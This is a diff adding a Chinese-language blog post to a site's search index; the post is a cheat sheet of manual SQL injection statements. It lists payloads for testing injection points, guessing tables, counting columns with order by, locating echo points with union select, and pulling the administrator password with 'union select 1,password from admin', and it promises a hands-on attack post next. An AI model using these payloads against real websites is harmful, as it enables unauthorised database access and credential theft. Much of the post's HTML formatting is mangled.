@@ -131,4 +131,32 @@
         <tag>python爬虫</tag>
       </tags>
   </entry>
+  <entry>
+    <title>sql手注常用语句</title>
+    <url>/2022/07/13/sql%E6%89%8B%E6%B3%A8%E5%B8%B8%E7%94%A8%E8%AF%AD%E5%8F%A5/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="sql手注常用语句"><a href="#sql手注常用语句" class="headerlink" title="sql手注常用语句"></a>sql手注常用语句</h2><h3 id="SQL常用语句-之-SQL猜表语句"><a href="#SQL常用语句-之-SQL猜表语句" class="headerlink" title="SQL常用语句 之 SQL猜表语句"></a>SQL常用语句 之 SQL猜表语句</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="number">0</span><span class="operator">&lt;&gt;</span>(<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> 想要猜测的表)</span><br><span class="line">#如页面正常 表存在</span><br></pre></td></tr></table></figure>
+
+ <span id="more"></span>
+
+<h3 id="SQL常用语句-之-SQL注入点"><a href="#SQL常用语句-之-SQL注入点" class="headerlink" title="SQL常用语句 之 SQL注入点"></a>SQL常用语句 之 SQL注入点</h3><ul>
+<li>~~~sql</li>
+</ul>
+<h1 id="常有的有"><a href="#常有的有" class="headerlink" title="常有的有"></a>常有的有</h1><p>  ?id&#x3D;1 and 1&#x3D;2<br>  ?id&#x3D;1’ and ‘1’&#x3D;’2 – -<br>  ?id&#x3D;2<br>  #如果 页面出错SQL注入点有效<br>  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">### SQL常用语句 之 SQL查字段</span><br><span class="line"></span><br><span class="line">- ~~~sql</span><br><span class="line">  and order by 字段数</span><br><span class="line">  #如页面不正常 将现在的字段数减1即可得到正确的字段数</span><br></pre></td></tr></table></figure></p>
+<h3 id="SQL常用语句-之-SQL联合查询"><a href="#SQL常用语句-之-SQL联合查询" class="headerlink" title="SQL常用语句  之  SQL联合查询"></a>SQL常用语句  之  SQL联合查询</h3><h4 id="SQL判断会显点"><a href="#SQL判断会显点" class="headerlink" title="SQL判断会显点"></a>SQL判断会显点</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>, ....</span><br><span class="line">#字段数按从小到大排序，中间用“，隔开”</span><br><span class="line">#比如[]<span class="operator">~</span>(￣▽￣)<span class="operator">~</span><span class="operator">*</span></span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span> #字段数为<span class="number">2</span></span><br><span class="line">#如果页面显示<span class="number">2</span> <span class="number">2</span>就是回显点</span><br></pre></td></tr></table></figure>
+
+<h4 id="SQL判断管理员密码"><a href="#SQL判断管理员密码" class="headerlink" title="SQL判断管理员密码"></a>SQL判断管理员密码</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,password <span class="keyword">from</span> #密码储存表</span><br><span class="line"># 如 admin</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,password <span class="keyword">from</span> admin </span><br></pre></td></tr></table></figure>
+
+<h3 id="预告"><a href="#预告" class="headerlink" title="预告"></a>预告</h3><div style="color: red">
+    下一篇教大家实战(❁´◡`❁)
+</div>
+
+]]></content>
+      <categories>
+        <category>SQL注入从入门到入狱</category>
+        <category>SQL语句整理</category>
+      </categories>
+      <tags>
+        <tag>sql注入</tag>
+      </tags>
+  </entry>
 </search>
